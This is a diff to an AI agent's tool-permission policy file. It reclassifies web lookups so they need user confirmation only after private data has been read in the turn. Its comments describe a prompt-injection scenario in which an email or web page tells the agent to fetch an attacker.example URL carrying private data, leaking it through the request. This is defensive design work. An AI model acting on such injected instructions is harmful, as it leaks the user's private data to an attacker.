@@ -41,6 +41,17 @@
 # Hand-written rules carry one; the generated connector rules below do not,
 # and a rule without it counts as irreversible. An
 # exception that raises the tier makes that call irreversible too.
+#
+# `reads_private` (owner decision 2026-10-24) says whether a call's RESULT is
+# the person's private data: their mail, calendar, files, notes, projects,
+# tasks, memory, a database, a connector's or any MCP server's data. A rule
+# WITHOUT it counts as a private read, and so does a tool no rule names: only
+# `reads_private: false` (the public web tools and pure utilities below) says
+# otherwise. It decides when the OUTBOUND tools need a card: an
+# `after_private_read: true` exception applies once a private read returned
+# data in the turn (app/policy/private_reads.py). Untrusted web content alone
+# does not escalate a lookup any more; exfiltration needs private data AND a
+# channel out.
 
 policy:
   rules:
@@ -90,18 +101,24 @@ policy:
     # ---------------------------------------------------------------------
     # Built-in tools
     # ---------------------------------------------------------------------
+    # Utilities whose result is not the person's data (`reads_private:
+    # false`): the question asked back, the files list it presents, the tool
+    # catalogue. view_image is NOT among them: the image is the person's file.
     - pattern: "ask_clarification"
       tier: 1
       reversible: true
+      reads_private: false
     - pattern: "view_image"
       tier: 1
       reversible: true
     - pattern: "present_files"
       tier: 1
       reversible: true
+      reads_private: false
     - pattern: "tool_search"
       tier: 1
       reversible: true
+      reads_private: false
     # The agent's own to-do list: it changes only this conversation's state,
     # reaches nothing outside it, and is rewritten freely. Unclassified, it
     # fell to Tier 3, so every to-do update asked for a confirmation, and a
@@ -111,6 +128,7 @@ policy:
     - pattern: "write_todos"
       tier: 1
       reversible: true
+      reads_private: false
 
     # Local reads, listings and metadata. Added 2026-08-25 after enumerating
     # what the lead agent ACTUALLY has: 3 of 39 tools were classified, so
@@ -150,35 +168,49 @@ policy:
     # Outbound reads: each sends an agent-chosen URL or query off the machine
     # (every provider: ddg/serper/tavily/exa/firecrawl search, jina/exa/
     # firecrawl fetch, image search, all registered under these three names).
-    # Tier 1 in a clean turn: a lookup the user asked for creates nothing,
-    # modifies nothing and notifies nobody, and a card on every lookup trains
-    # approving without reading.
+    # Their own results are public web content, not the person's data
+    # (`reads_private: false`).
     #
-    # Tier 3 once content has entered the turn (`after_content`: the call's
-    # origin is not the user's own message: a tool result, an automation's
-    # turn, or a cause nobody could tell; app/policy/lineage.py). An email or
-    # page the agent read can tell it to fetch
-    # https://attacker.example/?d=<private data>, and the fetch IS the leak:
-    # the request reaches the attacker's server whatever comes back
-    # (zero-click exfiltration, review 4; user decision 2026-10-21). From
-    # there the call is a card, confirmable only with its button.
+    # Tier 1 unless the turn has READ PRIVATE DATA (`after_private_read`,
+    # owner decision 2026-10-24): a research request ("find 5 date-night
+    # restaurants in Philly with links") searches and fetches page after page
+    # without a card, however untrusted those pages are, because there is
+    # nothing of the person's for them to leak.
+    #
+    # Tier 3 once a tool that reads the person's private data (mail, calendar,
+    # files, the ledger, any connector or MCP tool, any tool with no rule)
+    # returned data in this turn, including through a delegate or before a
+    # confirmation the turn resumed from. From then an email or page can tell
+    # the agent to fetch https://attacker.example/?d=<private data>, and the
+    # fetch IS the leak: the request reaches the attacker's server whatever
+    # comes back (zero-click exfiltration, review 4). Such a call is a card,
+    # and since content suggested it, confirmable only with its button.
+    #
+    # This replaced `after_content` on these three (2026-10-21 to
+    # 2026-10-24: Tier 3 after ANY tool result, which made every lookup
+    # after the first search a card). Every other `after_content` use stands.
+    # specs/007-agent-improvement/tier-changes.md has the reasoning and the
+    # risks that remain.
     - pattern: "web_search"
       tier: 1
       reversible: true
+      reads_private: false
       exceptions:
-        - after_content: true
+        - after_private_read: true
           tier: 3
     - pattern: "web_fetch"
       tier: 1
       reversible: true
+      reads_private: false
       exceptions:
-        - after_content: true
+        - after_private_read: true
           tier: 3
     - pattern: "image_search"
       tier: 1
       reversible: true
+      reads_private: false
       exceptions:
-        - after_content: true
+        - after_private_read: true
           tier: 3
     # Starts a preview server in the user's own sandbox — reversible (it can be
     # stopped) and worth mentioning, so Tier 2 rather than silent.
